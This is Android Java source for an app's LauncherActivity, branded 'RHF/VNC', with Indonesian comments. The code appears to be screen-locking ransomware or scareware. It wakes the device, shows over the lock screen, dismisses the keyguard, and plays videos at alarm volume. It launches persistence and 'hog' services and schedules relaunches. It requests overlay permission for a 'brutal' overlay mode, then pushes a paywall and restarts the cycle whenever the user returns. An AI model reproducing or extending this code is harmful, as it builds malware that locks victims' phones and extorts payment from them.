package com.rhfvnc.strain;
import android.app.Activity;
import android.content.Intent;
import android.graphics.Color;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.widget.FrameLayout;
import android.widget.TextView;
import android.widget.VideoView;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
public class LauncherActivity extends Activity {
    private static final int REQ_OVERLAY = 1;
    private VideoView vv;
    private List<Integer> order = new ArrayList<>();
    private int pos = 0;
    private boolean finishedCycle = false;
    private TextView brand;

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
                | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
                | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
                | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD);
        getWindow().getDecorView().setSystemUiVisibility(
                View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                        | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                        | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN);

        FrameLayout root = new FrameLayout(this);
        root.setBackgroundColor(Color.TRANSPARENT);

        vv = new VideoView(this);
        FrameLayout.LayoutParams lp = new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT);
        root.addView(vv, lp);

        brand = new TextView(this);
        brand.setText("RHF/VNC");
        brand.setTextColor(Color.RED);
        brand.setTextSize(28);
        brand.setShadowLayer(20, 0, 0, Color.RED);
        brand.setGravity(Gravity.TOP | Gravity.START);
        brand.setPadding(40, 60, 0, 0);
        FrameLayout.LayoutParams blp = new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.WRAP_CONTENT,
                FrameLayout.LayoutParams.WRAP_CONTENT);
        root.addView(brand, blp);

        setContentView(root);

        // shuffle urutan video 1..6
        for (int i = 1; i <= 6; i++) order.add(i);
        Collections.shuffle(order);

        vv.setOnPreparedListener(mp -> {
            mp.setAudioStreamType(AudioManager.STREAM_ALARM);
            mp.setVolume(1.0f, 1.0f);
            vv.start();
        });
        vv.setOnCompletionListener(mp -> playNext());
        vv.setOnErrorListener((mp, w, e) -> { playNext(); return true; });

        // service & persistence
        StrainService.start(this);
        HogService.start(this, HogService1.class);
        HogService.start(this, HogService2.class);
        HogService.start(this, HogService3.class);
        StrainReceiver.scheduleRelaunch(this, 20);

        // minta izin overlay (buat mode brutal setelah reject)
        if (Build.VERSION.SDK_INT >= 23 && !Settings.canDrawOverlays(this)) {
            try {
                Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                startActivityForResult(i, REQ_OVERLAY);
            } catch (Throwable ignored) {}
        }

        playNext();
    }

    @Override
    protected void onActivityResult(int req, int res, Intent data) {
        super.onActivityResult(req, res, data);
        if (req == REQ_OVERLAY && Build.VERSION.SDK_INT >= 23
                && Settings.canDrawOverlays(this)) {
            // aktifkan overlay brutal
            try { OverlayService.start(this); } catch (Throwable ignored) {}
        }
    }

    private void playNext() {
        if (pos >= order.size()) {
            if (!finishedCycle) {
                finishedCycle = true;
                Intent i = new Intent(this, PaywallActivity.class);
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                startActivity(i);
            }
            return;
        }
        int idx = order.get(pos++);
        int resId = getResources().getIdentifier("v" + idx, "raw", getPackageName());
        if (resId == 0) { playNext(); return; }
        Uri u = Uri.parse("android.resource://" + getPackageName() + "/" + resId);
        try { vv.setVideoURI(u); vv.start(); } catch (Throwable t) { playNext(); }
    }

    @Override
    protected void onResume() {
        super.onResume();
        // kalau balik ke launcher dan video udah habis siklus, ulang lagi
        if (finishedCycle) {
            finishedCycle = false;
            pos = 0;
            Collections.shuffle(order);
            playNext();
        } else if (vv != null && !vv.isPlaying()) {
            playNext();
        }
    }
}
